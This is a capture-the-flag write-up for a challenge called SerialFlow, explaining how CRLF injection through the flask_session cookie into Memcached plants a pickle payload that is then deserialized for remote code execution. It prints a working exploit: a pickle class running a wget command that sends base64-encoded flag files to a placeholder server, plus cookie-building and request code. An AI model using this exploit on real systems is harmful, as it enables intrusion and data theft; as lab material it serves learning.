# SerialFlow

>SerialFlow is the main global network used by KORP, you have managed to reach a root server web interface by traversing KORP's external proxy network. Can you break into the root server and open pandoras box by revealing the truth behind KORP?

Difficulty: __medium__  
Source Code: Provided

__Obs:__ _Todos os arquivos referenciados foram disponibilizados no desafio._

[Memcached Command Injections at Pylibmc](https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/) is the vulnerability that will be exploited in this challenge.

__Memcached__ is an in-memory caching system that, when used with __flask_session__, Could have a significant risk to applications. This is because it is possible to inject serialized objects into __Memcached__, and when these objects are loaded by __flask_session__, they are deserialized, allowing command injection.

The main commands we need to know about __Memcached__ are:
__Note:__ The information was taken from the mentioned article.

| Command | Format                                                          |
| :------ | :-------------------------------------------------------------- |
| set     | `set <key> <flags> <expiry> <datalen> [noreplay]\r\n<data>\r\n` |
| get     | `get <key>\r\n`                                                 |
- __flag:__ data specific client side flags
- __expiry:__ expiration time (in seconds)
- __datalen:__ size of the data (in bytes)
- __data__: data block

## How are the commands injected?

__Memcached__ supports both plaintext and binary in its communication protocol, and commands are separated by __CRLF__. So when flask_session saves or load information in __Memcached__, we can send multiple commands separated by `\r\n`.

## In practice

Our challenge uses __Memcached__ + __flask_session__. The injection point is the `sessionId` which is stored in the `Cookies` with the key `session`.

So, if we make a __GET__ request to the server with the following value: `session=RANDOM_KEY\r\nset session:1337 0 2592000 1\r\nA\r\n`.
The __flask_session__ will search for the session using the value we passed in the cookies. It will send the command `get RANDOM_KEY\r\nset session:1337 0 2592000 1\r\nA\r\n` to __Memcached__. As __CRLF__ is used as a separator. __Memcached__ will interpret the command as two, separating them at the first `\r\n` and executing a get and a set.

Thus, we will insert a new session with the `key` 1337, `flag` 0, `expiry` in 2592000 with an information of 1 byte in length which is the value A.

## Exploit

First, we will create an object to serialize with __pickle__ in python.
```python
class RCE:
    def __reduce__(self):
        cmd = ('wget https://{YOUR_SERVER}?flag=$(cat /flag*.txt | base64)')
        return os.system, (cmd,)
```

We need to generate the payload with our RCE
```python
def generate_exploit(session_id):
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = session_id.encode('utf-8') + b'\r\nset session:1337 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get session:1337')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""
```

Then we will make two calls to the server.
First, to save our serialized code in __Memcached__
Then, to make the __flask_session__ load our payload and deserialize our code thus executing our command.
```python
url = "http://{IP}:{PORT}"

response = requests.get(url)
session_id = response.headers['Set-Cookie'].split("session=")[1].split(';')[0]
requests.get(url, cookies={"session": generate_exploit(session_id)})
response = requests.get(url, cookies={"session": "1337"})
print(response.content)
``` 
